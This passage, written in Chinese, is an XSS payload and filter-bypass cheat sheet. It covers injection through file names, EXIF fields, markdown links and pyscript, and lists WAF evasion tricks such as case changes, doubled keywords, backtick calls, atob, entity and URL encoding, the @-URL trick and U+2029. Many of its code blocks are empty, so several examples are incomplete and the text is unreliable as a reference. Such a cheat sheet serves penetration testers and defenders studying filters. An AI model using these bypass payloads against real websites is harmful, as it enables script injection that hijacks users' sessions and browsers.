示例
```html
```
#### 用在其他功能点
**文件名**
```
">.png
```
**exif 数据**
```bash
exiftool -Artist='">' test.jpeg
```
**SVG**
```svg
```
**markdown**
```
[Click Me](javascript:alert('1'))
```
**xml**
```xml
alert(1)
```
#### pyscript
- https://github.com/pyscript/pyscript
```script
'\74img/src/onerror\75alert(1)\76'
```
---
## 绕过技巧
1. 使用无害的 payload,类似`,,`观察响应,判断应用程序是否被 HTML 编码,是否标签被过滤,是否过滤 `<>` 等等;
2. 如果过滤闭合标签,尝试无闭合标签的 payload `alert(xss);
```
### 内容检测
#### 换行
```js
```
#### 过滤关键字,大小写绕过
```html
```
#### 不闭合
```js
```
#### 双写关键字
有些 waf 可能会只替换一次且是替换为空,这种情况下我们可以考虑双写关键字绕过
```js
```
#### 替换绕过
过滤 eval 用 Function 代替
```
❌ eval(alert('xss'))
✔ Function(alert('xss'))
```
过滤 ('') 用 `` 代替绕过
```
❌ alert('xss')
✔ alert`xss`
```
过滤 alert 用 prompt,confirm,top['alert'](1) 代替绕过
过滤空格 用 %0a(换行符),%0d(回车符),/**/ 代替绕过
小写转大写情况下 字符 ſ 大写后为 S(ſ 不等于 s)
#### 利用 atob 绕过
```
❌ (alert('xss'))
✔ atob("YWxlcnQoInhzcyIp")
```
#### 利用 eval
```js
```
#### 利用 top
```js
```
#### %00截断绕过
```js
xss
```
#### 其它字符混淆
有的 waf 可能是用正则表达式去检测是否有 xss 攻击,如果我们能 fuzz 出正则的规则,则我们就可以使用其它字符去混淆我们注入的代码了,举几个简单的例子
可利用注释、标签的优先级等
```js
alert("xss");//
> //因为 title 标签的优先级比 img 的高,所以会先闭合 title,从而导致前面的 img 标签无效
```
#### 通过编码绕过
```js
实体编码
javascrip&#x74;:alert(1) 十六进制
javascrip&#116;:alert(1) 十进制
Unicode编码绕过
url编码绕过
Ascii码绕过
hex绕过
八进制
base64绕过
```
#### 过滤双引号,单引号
```js
1.如果是html标签中,我们可以不用引号.如果是在js中,我们可以用反引号代替单双引号
2.使用编码绕过,具体看上面我列举的例子,我就不多赘述了
```
#### 过滤括号
```js
当括号被过滤的时候可以使用throw来绕过
```
#### 过滤url地址
```js
// 使用url编码
// 使用IP
// 1.十进制IP
// 2.八进制IP
// 3.hex
// 4.html标签中用//可以代替http://
// 5.使用\\,但是要注意在windows下\本身就有特殊用途,是一个path 的写法,所以\\在Windows下是file协议,在linux下才会是当前域的协议
// 6.使用中文逗号代替英文逗号,如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号
//会自动跳转到百度
```
#### javascript 伪协议绕过
无法闭合双引号的情况下,就无法使用 onclick 等事件,只能伪协议绕过,或者调用外部 js
```js
注释符
// 单行注释
 注释多行内容
 注释多行内容
 注释多行内容
 注释多行内容
--> 单行注释后面内容
/* */ 多行注释
有时还可以利用浏览器的容错性,不需要注释
```
```js
闭合标签空格绕过
```
```
@ 符号绕过 url 限制
例如:https://PI:EMAIL/j.js
其实访问的是 @ 后面的内容
```
```
") 逃逸函数后接分号
例:");alert(1)//
```
```
绕过转义限制
例:
\")
alert(1) //
```
#### 输入会被大写化
先把纯文本字符转换为 HTML 实体字符, 然后对其进行 URL 编码, 最后用 SVG 标记的 onload 参数输出
```html
```
#### U+2029 XSS
段落分隔符，即 U+2029，是用于字符分隔的 Unicode 值，但它是一个在网络上不常使用的字符。
```js
#!@*% alert(1)
```